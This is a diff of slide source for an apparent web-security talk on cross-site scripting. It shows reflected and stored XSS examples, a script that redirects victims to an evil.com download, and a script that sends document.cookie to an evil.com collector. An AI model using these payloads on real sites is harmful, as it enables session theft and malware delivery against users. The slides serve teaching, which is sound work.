@@ -219,80 +219,31 @@ Cross-site scripting
 # Goal
 Inject bad stuff in user's browsers
 ---
-# Goal
-```
-HTTP/1.1 200 OK
-Cache-Control: max-age=604800
-Content-Type: text/html
-Content-Length: 1270
-Connection: close
-
-<!doctype html>
-<html>
-<head>
-...
-```
-<b>bad stuff goes here</b>
----
 # For fun
 ```
-HTTP/1.1 200 OK
-Cache-Control: max-age=604800
-Content-Type: text/html
-Content-Length: 1270
-Connection: close
-
-<!doctype html>
-<html>
-<head>
-...
 <h1>MOHAHAHAH YOU HAVE BEEN HACKED!!!</h1>
 ```
+<img src="mohaha.png" width="100%">
 ---
 # To get money
 ```
-HTTP/1.1 200 OK
-Cache-Control: max-age=604800
-Content-Type: text/html
-Content-Length: 1270
-Connection: close
-
-<!doctype html>
-<html>
-<head>
-...
 <h1>We have stolen all your stuff! Send a ton of $$$$</h1>
 ```
+<img src="steal.png" width="100%">
 ---
 # To spread malware
 ```
-HTTP/1.1 200 OK
-Cache-Control: max-age=604800
-Content-Type: text/html
-Content-Length: 1270
-Connection: close
-
-<!doctype html>
-<html>
-<head>
-...
-<script>window.location = "http://evil.com/malware.exe";</script>
+<script>window.location = "http://evil.com/prophecy.zip";</script>
 ```
+<img src="download.png" width="100%">
 ---
 # What does this do? and why?
 ```
-HTTP/1.1 200 OK
-Cache-Control: max-age=604800
-Content-Type: text/html
-Content-Length: 1270
-Connection: close
-
-<!doctype html>
-<html>
-<head>
-...
 <script>
-document.write('<img src="http://evil.com/collect.gif?x=' + escape(document.cookie) + '" />');
+
+a = '<img src="http://evil.com/collect.gif?x=' + escape(document.cookie) + '" />';
+document.write(a);
+
 </script>
 ```
 ---
@@ -336,10 +287,18 @@ GET /search=<script>alert("xss");</script> HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
+```
+HTTP response:
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1270
 Connection: close
-Upgrade-Insecure-Requests: 1
+
+<!doctype html>
+<html>
+...
+Your search for "<script>alert("xss");</script>" gave 0 results.
 ```
 ---
 class: center, middle
@@ -352,6 +311,36 @@ Two step attack:
 2. Victim user visits website, which serves the payload to the victim
 
 Note: XSS payload is stored, potentially forever, on the website.
+
+---
+# Stored XSS
+Step 1: inject payload on http://example.com/addYourName.php
+
+<img src="postxss.png">
+```
+POST /addYourName.php HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+
+fname=Kevin%3Cscript%3Ealert%28%22xss%22%29%3B%3C%2Fscript%3E&lname=
+```
+Step 2: on http://example.com/ViewAllNames.php
+```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+...
+<p>Names of visitors:</p>
+<ul>
+  <li>Robert</li>
+  <li>John</li>
+  <li>Kevin<script>alert("xss");</script><li>
+</ul>
+```
+
+
 
 ---
 class: center, middle
@@ -390,6 +379,11 @@ Upgrade-Insecure-Requests: 1
 ---
 # Example
 ```
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 1270
+Connection: close
+
 <html>
   <script>
 
@@ -453,7 +447,7 @@ full source: https://github.com/magnusstubman/presentations/blob/master/evil/wor
 
 
 ---
-# references
+# References
 - slides: http://dumpco.re/websec
 - WordPress XSS to RCE payload: https://github.com/magnusstubman/presentations/blob/master/evil/wordpressxss2rce.js
     </textarea>
